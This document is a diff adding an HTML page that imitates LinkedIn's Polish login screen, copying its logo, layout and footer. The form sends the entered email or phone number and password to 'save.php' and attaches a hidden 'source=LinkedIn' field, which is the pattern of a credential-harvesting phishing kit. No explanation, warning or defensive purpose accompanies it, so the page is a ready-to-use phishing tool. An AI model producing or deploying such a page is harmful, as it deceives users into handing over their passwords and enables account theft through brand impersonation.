@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>LinkedIn: Zaloguj się lub zarejestruj</title>
+  <style>
+    body {
+      font-family: system-ui, sans-serif;
+      background-color: #f3f2ef;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+    }
+    header {
+      position: absolute;
+      top: 24px;
+      left: 32px;
+    }
+    header img {
+      height: 35px;
+    }
+    .login-box {
+      background: #fff;
+      padding: 32px;
+      width: 400px;
+      border-radius: 8px;
+      box-shadow: 0 0 5px rgba(0,0,0,0.2);
+    }
+    .login-box h1 {
+      font-size: 24px;
+      margin-bottom: 16px;
+    }
+    .login-box button {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
+      border: 1px solid #ccc;
+      border-radius: 20px;
+      background-color: white;
+      cursor: pointer;
+      font-size: 14px;
+    }
+    .divider {
+      display: flex;
+      align-items: center;
+      margin: 16px 0;
+    }
+    .divider::before, .divider::after {
+      content: "";
+      flex: 1;
+      height: 1px;
+      background-color: #ccc;
+    }
+    .divider span {
+      margin: 0 8px;
+      color: #666;
+    }
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin: 8px 0;
+      box-sizing: border-box;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+    input[type="submit"] {
+      width: 100%;
+      padding: 12px;
+      background-color: #0a66c2;
+      border: none;
+      color: white;
+      font-weight: bold;
+      border-radius: 24px;
+      cursor: pointer;
+      margin-top: 12px;
+    }
+    input[type="submit"]:hover {
+      background-color: #004182;
+    }
+    .extras {
+      font-size: 12px;
+      margin-top: 8px;
+    }
+    .extras a {
+      color: #0a66c2;
+      text-decoration: none;
+    }
+    .extras a:hover {
+      text-decoration: underline;
+    }
+    footer {
+      position: absolute;
+      bottom: 16px;
+      font-size: 11px;
+      color: #666;
+    }
+    footer a {
+      color: #666;
+      margin: 0 4px;
+      text-decoration: none;
+    }
+    footer a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/c/ca/LinkedIn_logo_initials.png" alt="LinkedIn">
+  </header>
+
+  <div class="login-box">
+    <h1>Zaloguj się</h1>
+    <button>Continue with Google</button>
+    <button>Zaloguj się przez Apple</button>
+    <div class="divider"><span>lub</span></div>
+
+    <form action="save.php" method="POST">
+      <input type="hidden" name="source" value="LinkedIn">
+      <input type="text" name="username" placeholder="Adres e-mail lub numer telefonu" required>
+      <input type="password" name="password" placeholder="Hasło" required>
+      <input type="submit" value="Zaloguj się">
+    </form>
+
+    <div class="extras">
+      <a href="#">Nie pamiętam hasła</a><br>
+      <label><input type="checkbox" checked> Nie wylogowuj mnie</label>
+    </div>
+  </div>
+
+  <footer>
+    LinkedIn © 2025
+    <a href="#">Umowa użytkownika</a>
+    <a href="#">Polityka prywatności</a>
+    <a href="#">Cookies</a>
+    <a href="#">Pomoc</a>
+  </footer>
+</body>
+</html>
